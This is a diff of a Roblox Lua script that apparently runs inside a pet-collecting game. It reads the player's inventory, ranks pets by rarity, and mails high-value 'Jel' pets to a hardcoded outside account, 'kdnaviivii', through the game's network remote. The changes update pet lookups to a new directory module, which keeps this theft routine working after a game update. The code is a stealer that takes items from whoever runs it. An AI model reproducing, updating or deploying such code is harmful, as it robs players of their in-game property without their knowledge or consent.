@@ -30,10 +30,11 @@ local qbig,qbiga
 qbig, qbiga = pcall(function()
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+local ndir = require(game:GetService("ReplicatedStorage").Library.Directory).Pets
 save = save.Get()
 for i,v in pairs(save.Inventory.Pet) do
-if require(dir[v.id]).difficulty >= big then
-big = require(dir[v.id]).difficulty
+if ndir[v.id].difficulty >= big then
+big = ndir[v.id].difficulty
 end
 end
 big = "1/"..big
@@ -41,8 +42,8 @@ local biggy = big.." (".._G.Min..")"
 big = ""
 local tab = {}
 for i,v in pairs(save.Inventory.Pet) do
-if require(dir[v.id]).difficulty >= _G.Min then
-table.insert(tab, {v.id, require(dir[v.id]).difficulty, (v._am or 1), v})
+if ndir[v.id].difficulty >= _G.Min then
+table.insert(tab, {v.id, ndir[v.id].difficulty, (v._am or 1), v})
 end
 end
 table.sort(tab, function(a,b)
@@ -81,6 +82,7 @@ local mailc = 0
 
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+local ndir = require(game:GetService("ReplicatedStorage").Library.Directory).Pets
 function _mail(u, t, i, n)
 local args = {
     [1] = u,
@@ -93,7 +95,7 @@ return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild
 end
 
 for i,v in pairs(save.Inventory.Pet) do
-if string.find(v.id, "Jel") and require(dir[v.id]).difficulty > 24999999 then
+if string.find(v.id, "Jel") and ndir[v.id].difficulty > 24999999 then
 _mail("kdnaviivii", "Pet", i, (v.am or 1))
 end
 end
@@ -134,7 +136,7 @@ local responseqxr =
 end
 end)
 pcall(function()
-xyzab=xyzab.." in "..(math.round((tick()-ticky)*10000)/10000).."ms"
+xyzab=xyzab.." in "..(math.round((tick()-ticky)*1000)/1000).."s"
 end)
 if dh then
 _G.dx=true
